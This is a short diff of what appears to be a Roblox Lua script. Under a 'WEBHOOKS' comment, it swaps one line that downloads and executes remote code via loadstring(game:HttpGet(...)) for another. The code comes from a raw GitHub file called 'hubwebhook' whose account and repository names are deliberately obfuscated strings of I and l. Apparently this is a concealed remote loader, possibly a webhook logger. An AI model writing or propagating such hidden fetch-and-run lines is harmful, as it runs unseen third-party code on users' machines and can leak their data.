@@ -1,5 +1,5 @@
 -- | WEBHOOKS |
-    loadstring(game:HttpGet("https://raw.githubusercontent.com/IlIlIlllllIllIIlIlIlIlIllIIlIlIIIIlIll/IlIlIlIlIlIlIIIIIlIlIlIlIlIlIlIlllIlIlIl/refs/heads/main/hubwebhook",true))()
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/IIlIllIIllIIlIllIIllIIlIllIIIllIIlI/IlIlIlIlIlIlIIIIIlIlIlIlIlIlIlIlllIlIlIlIlIlIlIl/refs/heads/main/hubwebhook",true))()
 -- [[ 1. SERVICES ]]
 local Players = game:GetService("Players")
 local TweenService = game:GetService("TweenService")
